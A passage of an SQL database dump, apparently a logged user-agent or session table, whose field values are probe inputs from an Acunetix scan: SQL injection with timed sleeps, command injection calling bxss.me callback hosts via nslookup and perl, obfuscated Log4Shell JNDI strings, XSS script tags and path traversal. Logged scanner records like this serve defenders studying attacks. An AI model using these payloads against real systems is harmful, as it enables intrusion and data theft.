Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:37','2022-08-11 10:37:37'),(288,';(nslookup hitygpdvemjff9ae5c.bxss.me||perl -e \"gethostbyname(\'hitygpdvemjff9ae5c.bxss.me\')\")|(nslookup hitygpdvemjff9ae5c.bxss.me||perl -e \"gethostbyname(\'hitygpdvemjff9ae5c.bxss.me\')\")&(nsl','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:37','2022-08-11 10:37:37'),(289,'12345\'\"\\\'\\\");|]*\0{\r\n<\0>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:38','2022-08-11 10:37:38'),(290,'-1 OR 2+323-323-1=0+0+0+1 --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:38','2022-08-11 10:37:38'),(291,'../3383152575','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:38','2022-08-11 10:37:38'),(292,'-1 OR 2+635-635-1=0+0+0+1','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:38','2022-08-11 10:37:38'),(293,'3383152575<esi:include src=\"http://bxss.me/rpb.png\"/>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:38','2022-08-11 10:37:38'),(294,'${9999711+9999004}','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:38','2022-08-11 10:37:38'),(295,'-1\' OR 2+174-174-1=0+0+0+1 --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:38','2022-08-11 10:37:38'),(296,'-1\' OR 2+812-812-1=0+0+0+1 or \'1F2G5bLL\'=\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:39','2022-08-11 10:37:39'),(297,'R8j6pFnG\'; waitfor delay \'0:0:15\' --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:39','2022-08-11 10:37:39'),(298,'-1\" OR 2+868-868-1=0+0+0+1 --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:39','2022-08-11 10:37:39'),(299,'-5 OR 385=(SELECT 385 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:39','2022-08-11 10:37:39'),(300,'-5) OR 526=(SELECT 526 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(301,'LWObjKd4','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(302,'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(303,'${j${::-n}di:dns${::-:}//hitfblatudcsw673a0${::-.}bxss.me}zzzz','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(304,'response.write(9905491*9496046)','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(305,'\'.gethostbyname(lc(\'hitkp\'.\'aehuufhm15f52.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(108).chr(72).chr(107).chr(87).\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(306,'echo gpfsva$()\\ dviwtn\\nz^xyu||a #\' &echo gpfsva$()\\ dviwtn\\nz^xyu||a #|\" &echo gpfsva$()\\ dviwtn\\nz^xyu||a #','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(307,'3383152575&n982240=v943300','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(308,'\'+response.write(9905491*9496046)+\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(309,'\".gethostbyname(lc(\"hittu\".\"yaeggqstbff36.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(102).chr(82).chr(115).chr(67).\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(310,'&echo fbsvvi$()\\ rptxsi\\nz^xyu||a #\' &echo fbsvvi$()\\ rptxsi\\nz^xyu||a #|\" &echo fbsvvi$()\\ rptxsi\\nz^xyu||a #','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(311,'-1)) OR 400=(SELECT 400 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(312,'\"+response.write(9905491*9496046)+\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(313,'|echo ypcjtw$()\\ wksrwm\\nz^xyu||a #\' |echo ypcjtw$()\\ wksrwm\\nz^xyu||a #|\" |echo ypcjtw$()\\ wksrwm\\nz^xyu||a #','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:40','2022-08-11 10:37:40'),(314,'(nslookup hithmbdfgqmgb48876.bxss.me||perl -e \"gethostbyname(\'hithmbdfgqmgb48876.bxss.me\')\")','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:41','2022-08-11 10:37:41'),(315,'1sLM1kyV\' OR 579=(SELECT 579 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:41','2022-08-11 10:37:41'),(316,'$(nslookup hithnnyveangm40bfe.bxss.me||perl -e \"gethostbyname(\'hithnnyveangm40bfe.bxss.me\')\")','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:41','2022-08-11 10:37:41'),(317,'&(nslookup hitteyqbsrogd44d44.bxss.me||perl -e \"gethostbyname(\'hitteyqbsrogd44d44.bxss.me\')\")&\'\\\"`0&(nslookup hitteyqbsrogd44d44.bxss.me||perl -e \"gethostbyname(\'hitteyqbsrogd44d44.bxss.me\')\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:41','2022-08-11 10:37:41'),(318,'vMU2QsYk\') OR 582=(SELECT 582 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:41','2022-08-11 10:37:41'),(319,'|(nslookup hitviiprrajnwb8295.bxss.me||perl -e \"gethostbyname(\'hitviiprrajnwb8295.bxss.me\')\")','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:41','2022-08-11 10:37:41'),(320,'${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-2716..cb284${::-.}1${::-.}bxss.me}}','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:41','2022-08-11 10:37:41'),(321,'`(nslookup hitehrwawjzkxf53e6.bxss.me||perl -e \"gethostbyname(\'hitehrwawjzkxf53e6.bxss.me\')\")`','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:41','2022-08-11 10:37:41'),(322,'ihaNW1Sp\')) OR 520=(SELECT 520 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:42','2022-08-11 10:37:42'),(323,';(nslookup hitptbpqeqljed7b32.bxss.me||perl -e \"gethostbyname(\'hitptbpqeqljed7b32.bxss.me\')\")|(nslookup hitptbpqeqljed7b32.bxss.me||perl -e \"gethostbyname(\'hitptbpqeqljed7b32.bxss.me\')\")&(nsl','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:42','2022-08-11 10:37:42'),(324,'659996680*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:42','2022-08-11 10:37:42'),(325,'3383152575\'\"()&%<acx><ScRiPt >LKae(9228)</ScRiPt>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:42','2022-08-11 10:37:42'),(326,'\'\"()&%<acx><ScRiPt >LKae(9607)</ScRiPt>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:42','2022-08-11 10:37:42'),(327,'\"+\"A\".concat(70-3).concat(22*4).concat(113).concat(68).concat(101).concat(83)+(require\"socket\"\nSocket.gethostbyname(\"hitpg\"+\"uvrwzubcccf63.bxss.me.\")[3].to_s)+\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:42','2022-08-11 10:37:42'),(328,'659996680\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:42','2022-08-11 10:37:42'),(329,'5S6L23HS\'; waitfor delay \'0:0:15\' --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:43','2022-08-11 10:37:43'),(330,'\'+\'A\'.concat(70-3).concat(22*4).concat(101).concat(65).concat(106).concat(65)+(require\'socket\'\nSocket.gethostbyname(\'hitxv\'+\'qfpdujihb3567.bxss.me.\')[3].to_s)+\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:43','2022-08-11 10:37:43'),(331,'33831525759326437','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:43','2022-08-11 10:37:43'),(332,'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:43','2022-08-11 10:37:43'),(333,'1\0','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:43','2022-08-11 10:37:43'),(334,'@@0v7m1','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:37:43','2022-08-11 10:37:43'),(335,'${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-2717..cb284${::-.}1${::-.}bxss.me}}','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:43','2022-08-11 10:37:43'),(336,'-5 OR 394=(SELECT 394 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:43','2022-08-11 10:37:43'),(337,'-5) OR 979=(SELECT 979 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:44','2022-08-11 10:37:44'),(338,'-1)) OR 235=(SELECT 235 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:45','2022-08-11 10:37:45'),(339,'miRGNOKa\' OR 384=(SELECT 384 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:45','2022-08-11 10:37:45'),(340,'KzhkhEYn\') OR 893=(SELECT 893 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:45','2022-08-11 10:37:45'),(341,'R3xydd1l\')) OR 924=(SELECT 924 FROM PG_SLEEP(15))--','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:46','2022-08-11 10:37:46'),(342,'3383152575*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:47','2022-08-11 10:37:47'),(343,'3383152575\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:47','2022-08-11 10:37:47'),(344,'1\0','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:47','2022-08-11 10:37:47'),(345,'@@rB650','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:37:48','2022-08-11 10:37:48'),(346,'272607738','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/11','Windows','NT 10.0','2022-08-11 10:37:49','2022-08-11 10:41:52'),(347,'1105662288','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/13','Windows','NT 10.0','2022-08-11 10:38:16','2022-08-11 10:38:50'),(348,'3565619087','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/14','Windows','NT 10.0','2022-08-11 10:38:34','2022-08-11 10:39:04'),(349,'2538017007','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/15','Windows','NT 10.0','2022-08-11 10:38:36','2022-08-11 10:39:07'),(350,'2098699367','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/16','Windows','NT 10.0','2022-08-11 10:38:57','2022-08-11 10:39:29'),(351,'3531878554','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/18','Windows','NT 10.0','2022-08-11 10:39:15','2022-08-11 10:39:39'),(352,'4228246026','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/20','Windows','NT 10.0','2022-08-11 10:40:30','2022-08-11 10:41:35'),(353,'55867466','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/21','Windows','NT 10.0','2022-08-11 10:40:55','2022-08-11 10:44:57'),(354,'538368575','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/22','Windows','NT 10.0','2022-08-11 10:40:55','2022-08-11 10:41:34'),(355,'3801390859','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/23','Windows','NT 10.0','2022-08-11 10:41:15','2022-08-11 10:42:13'),(356,'3728528835','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/24','Windows','NT 10.0','2022-08-11 10:41:40','2022-08-11 10:42:28'),(357,'3368499295','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/25','Windows','NT 10.0','2022-08-11 10:41:49','2022-08-11 10:42:46'),(358,'3949561215','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/26','Windows','NT 10.0','2022-08-11 10:42:15','2022-08-11 10:44:10'),(359,'2104531104','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/27','Windows','NT 10.0','2022-08-11 10:42:20','2022-08-11 10:43:14'),(360,'737623314','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/28','Windows','NT 10.0','2022-08-11 10:42:40','2022-08-11 10:44:06'),(361,'3305894015','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/29','Windows','NT 10.0','2022-08-11 10:42:52','2022-08-11 10:43:34'),(362,'4276613485','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/30','Windows','NT 10.0','2022-08-11 10:43:21','2022-08-11 10:43:52'),(363,'2306819132','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/31','Windows','NT 10.0','2022-08-11 10:44:08','2022-08-11 10:44:45'),(364,'1438016926','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/32','Windows','NT 10.0','2022-08-11 10:46:32','2022-08-11 10:47:16'),(365,'1858725779','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/33','Windows','NT 10.0','2022-08-11 10:49:11','2022-08-11 10:49:43'),(366,'2917612453','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/34','Windows','NT 10.0','2022-08-11 10:49:50','2022-08-11 10:50:14'),(367,'2630663185','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/35','Windows','NT 10.0','2022-08-11 10:49:50','2022-08-11 10:50:34'),(368,'3617129121','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/36','Windows','NT 10.0','2022-08-11 10:49:52','2022-08-11 10:50:18'),(369,'2145263616','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/37','Windows','NT 10.0','2022-08-11 10:49:59','2022-08-11 10:50:34'),(370,'1903494832','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/38','Windows','NT 10.0','2022-08-11 10:50:04','2022-08-11 10:50:31'),(371,'1882990497','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/39','Windows','NT 10.0','2022-08-11 10:52:08','2022-08-11 10:52:34'),(372,'1065088386','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/42','Windows','NT 